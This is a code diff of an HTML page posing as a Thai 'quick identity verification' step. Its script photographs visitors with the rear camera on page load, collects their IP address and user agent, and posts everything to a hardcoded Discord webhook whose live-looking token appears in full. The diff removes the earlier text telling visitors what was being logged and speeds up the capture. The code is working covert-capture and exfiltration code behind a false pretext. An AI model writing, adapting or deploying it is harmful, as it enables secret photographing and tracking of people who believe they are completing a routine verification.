@@ -3,56 +3,41 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>ยืนยันตัว (1 รูป)</title>
+<title>Auto-capture (instant)</title>
 <style>
-  /* มินิมอล เรียบหรู พื้นขาว */
-  :root { --accent: #0b74de; --muted:#6b6b73; }
-  html,body{height:100%;margin:0;background:#fff;color:#111;font-family:Inter,system-ui,-apple-system,Segoe UI,Roboto,"Helvetica Neue",Arial}
-  .container{height:100%;display:flex;align-items:center;justify-content:center;padding:28px}
-  .card{max-width:640px;width:100%;text-align:left}
-  .headline{font-size:20px;font-weight:700;margin:0 0 6px}
-  .lead{color:var(--muted);margin:0 0 14px;font-size:14px;line-height:1.4}
-  .meta { background:#f7f9fc;border-radius:8px;padding:12px;font-size:13px;color:#333;border:1px solid #eef3fb }
-  .status { margin-top:12px;color:var(--accent);font-weight:700;font-size:14px }
-  .small { margin-top:10px;color:var(--muted);font-size:12px }
-  /* ซ่อนวิดีโอ/canvas (จำเป็นแต่ไม่แสดง) */
+  html,body{height:100%;margin:0;background:#fff;color:#111;font-family:Inter,system-ui,-apple-system,Segoe UI,Roboto,Arial;display:flex;align-items:center;justify-content:center}
+  .box{text-align:center;padding:24px;max-width:640px}
+  .title{font-weight:700;font-size:18px;margin-bottom:6px}
+  .sub{color:#666;font-size:14px;margin-bottom:12px}
+  .status{color:#0b74de;font-weight:700;margin-top:8px}
   video,canvas{display:none}
 </style>
 </head>
 <body>
-  <div class="container">
-    <div class="card">
-      <div class="headline">ยืนยันตัวอย่างรวดเร็ว</div>
-      <div class="lead">เพื่อความปลอดภัยและการให้บริการที่เป็นธรรม เราจะถ่ายภาพ <strong>เพียง 1 รูป</strong> ด้วยกล้องหลัง — รูปจะถูกส่งเพื่อบันทึกเหตุการณ์ (IP / เวลา / อุปกรณ์) และจะไม่ถูกเผยแพร่ที่อื่นโดยไม่ได้รับอนุญาต</div>
-
-      <div id="box" class="meta">
-        <div>Auto-capture (page load)</div>
-        <pre id="info" style="margin:6px 0 0;white-space:pre-wrap">กำลังเตรียมข้อมูล...</pre>
-        <div id="status" class="status">สถานะ: เริ่มต้น</div>
-        <div id="note" class="small">หมายเหตุ: โปรดอนุญาตกล้องเมื่อเบราว์เซอร์ถาม</div>
-      </div>
-    </div>
+  <div class="box">
+    <div class="title">ยืนยันตัวอย่างรวดเร็ว</div>
+    <div class="sub">กดอนุญาตกล้อง — ถ่ายภาพทันที (รอ 0.5 วินาทีให้กล้องเซ็ต) — ส่งขึ้น Discord</div>
+    <div id="status" class="status">สถานะ: รออนุญาตกล้อง</div>
   </div>
 
-  <!-- ซ่อนองค์ประกอบสำหรับถ่ายภาพ -->
   <video id="video" autoplay playsinline muted></video>
   <canvas id="canvas" width="640" height="640"></canvas>
 
 <script>
 /*
-  ฟังก์ชัน: ถ่าย 1 รูปจากกล้องหลัง -> ส่งเป็น multipart ไป Discord webhook
-  แก้ const DISCORD_WEBHOOK ให้เป็น webhook ของคุณ (ทดสอบส่วนตัวเท่านั้น)
-  ต้องเรียกจาก HTTPS หรือ localhost
+  Instant capture flow:
+  - Replace DISCORD_WEBHOOK with your webhook (test-only)
+  - Must open via HTTPS or localhost
+  - When user grants permission, wait 500ms, capture 1 image from rear camera, send to Discord
 */
-const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1433397916151582820/hhSimGg9DRkBcci2dWvEYljDzeO3Cgv-7qnvWzB-bcFLW7Vor5-K3ufGxgzQnOUf0dmJ"; // <<< เปลี่ยน
-const STATUS = document.getElementById('status');
-const INFO = document.getElementById('info');
-const NOTE = document.getElementById('note');
+
+const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1433397916151582820/hhSimGg9DRkBcci2dWvEYljDzeO3Cgv-7qnvWzB-bcFLW7Vor5-K3ufGxgzQnOUf0dmJ"; // <<< เปลี่ยนก่อนใช้งาน (ทดสอบส่วนตัวเท่านั้น)
+const statusEl = document.getElementById('status');
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
 const ctx = canvas.getContext('2d');
 
-function setStatus(t){ STATUS.textContent = 'สถานะ: ' + t; }
+function setStatus(t){ statusEl.textContent = 'สถานะ: ' + t; }
 function nowISOWithOffset(){
   const d = new Date();
   const pad = n => String(n).padStart(2,'0');
@@ -65,7 +50,7 @@ function nowISOWithOffset(){
 
 async function fetchIP(){
   try {
-    const r = await fetch('https://api.ipify.org?format=json',{cache:'no-store'});
+    const r = await fetch('https://api.ipify.org?format=json', {cache:'no-store'});
     if(!r.ok) throw new Error('HTTP ' + r.status);
     const j = await r.json();
     return j.ip || 'ไม่ทราบ';
@@ -91,75 +76,76 @@ async function sendToDiscord(blob, ip, ua, timeIso){
   const form = new FormData();
   form.append('file', blob, 'capture.jpg');
   const payload = {
-    content: `Auto-capture (page load)\nIP: ${ip}\nTime: ${timeIso}\nUser-Agent: ${ua}`
+    content: `Auto-capture (instant)\nIP: ${ip}\nTime: ${timeIso}\nUser-Agent: ${ua}`
   };
   form.append('payload_json', JSON.stringify(payload));
   try {
     const res = await fetch(DISCORD_WEBHOOK, { method:'POST', body: form });
     return res.ok;
   } catch(e){
-    console.warn('send failed', e);
+    console.warn('Send failed:', e);
     return false;
   }
 }
 
 (async function main(){
-  // ตรวจ HTTPS / localhost
+  // require HTTPS or localhost
   if(location.protocol !== 'https:' && location.hostname !== 'localhost'){
-    INFO.textContent = '⚠️ กรุณาเปิดผ่าน HTTPS หรือบน localhost (มือถือจะบล็อกกล้องบน HTTP)';
-    setStatus('ไม่สามารถใช้กล้อง (HTTP)');
+    setStatus('เปิดผ่าน HTTPS หรือ localhost เท่านั้น (มือถือจะบล็อกกล้องบน HTTP)');
     return;
   }
   if(!DISCORD_WEBHOOK || DISCORD_WEBHOOK.includes('ใส่_DISCORD')){
-    INFO.textContent = 'โปรดตั้งค่า DISCORD_WEBHOOK ในโค้ดก่อนใช้งาน';
-    setStatus('รอการตั้งค่า webhook');
+    setStatus('โปรดตั้งค่า DISCORD_WEBHOOK ในโค้ดก่อนใช้งาน');
     return;
   }
 
-  setStatus('ดึงข้อมูลเครือข่าย...');
-  const ip = await fetchIP();
-  const ua = navigator.userAgent || 'ไม่ทราบ';
-  const timeIso = nowISOWithOffset();
-
-  INFO.textContent = `IP\n${ip}\nTime\n${timeIso}\nUser-Agent\n${ua}`;
   setStatus('ขออนุญาตกล้อง (กล้องหลัง)...');
 
   try {
+    const ip = await fetchIP();
+    const ua = navigator.userAgent || 'ไม่ทราบ';
+    const timeIso = nowISOWithOffset();
+
     const stream = await openRearCamera();
     video.srcObject = stream;
+    // รอให้สตรีมเริ่มทำงาน
     await video.play().catch(()=>{});
-    setStatus('อนุญาตแล้ว — ถ่าย 1 รูป...');
-    // set canvas square
+    setStatus('อนุญาตแล้ว — รอกล้องเซ็ต 0.5 วินาทีแล้วถ่ายทันที');
+
+    // รอ 0.5 วินาทีเพื่อให้กล้องออโต้โฟกัส/ปรับแสง
+    await delay(500);
+
+    // เตรียม canvas เป็น square 640x640 แล้วถ่าย
     const vw = video.videoWidth || 1280;
     const vh = video.videoHeight || 720;
     const s = Math.min(vw, vh);
-    const sx = (vw - s)/2;
-    const sy = (vh - s)/2;
+    const sx = (vw - s) / 2;
+    const sy = (vh - s) / 2;
     canvas.width = 640; canvas.height = 640;
 
-    // draw (อาจต้องรอสั้น ๆ ให้ video ready)
     try { ctx.drawImage(video, sx, sy, s, s, 0, 0, canvas.width, canvas.height); }
     catch(e){
+      // ถ้ายังไม่พร้อม ลองรออีกนิดแล้วถ่ายอีกครั้ง
       await delay(150);
-      try { ctx.drawImage(video, sx, sy, s, s, 0, 0, canvas.width, canvas.height); } catch(e){ console.warn(e); }
+      try { ctx.drawImage(video, sx, sy, s, s, 0, 0, canvas.width, canvas.height); } catch(e2){ console.warn(e2); }
     }
 
-    const blob = await new Promise(res=>canvas.toBlob(res,'image/jpeg',0.92));
-    setStatus('กำลังส่งไปยัง Discord...');
+    const blob = await new Promise(res=>canvas.toBlob(res, 'image/jpeg', 0.92));
+
+    setStatus('กำลังส่งรูปไปยัง Discord...');
     const ok = await sendToDiscord(blob, ip, ua, timeIso);
+
     // ปิดกล้อง
     stream.getTracks().forEach(t=>t.stop());
+
     if(ok){
       setStatus('ส่งสำเร็จ ✅ ขอบคุณที่ยืนยัน');
-      NOTE.textContent = 'ข้อมูลถูกส่งเรียบร้อย — ข้อมูลจะถูกเก็บตามนโยบายความเป็นส่วนตัว';
     } else {
-      setStatus('ส่งล้มเหลว ❌');
-      NOTE.textContent = 'เกิดปัญหาในการส่ง (ตรวจ webhook หรือเชื่อมต่อเครือข่าย)';
+      setStatus('ส่งล้มเหลว ❌ ตรวจสอบ webhook หรือเชื่อมต่อเครือข่าย');
     }
   } catch(err){
     console.error(err);
     setStatus('ไม่สามารถเข้าถึงกล้อง: ' + (err.message || err));
-    NOTE.textContent = 'โปรดตรวจสอบสิทธิ์กล้องและรีเฟรชหน้า';
   }
 })();
 </script>
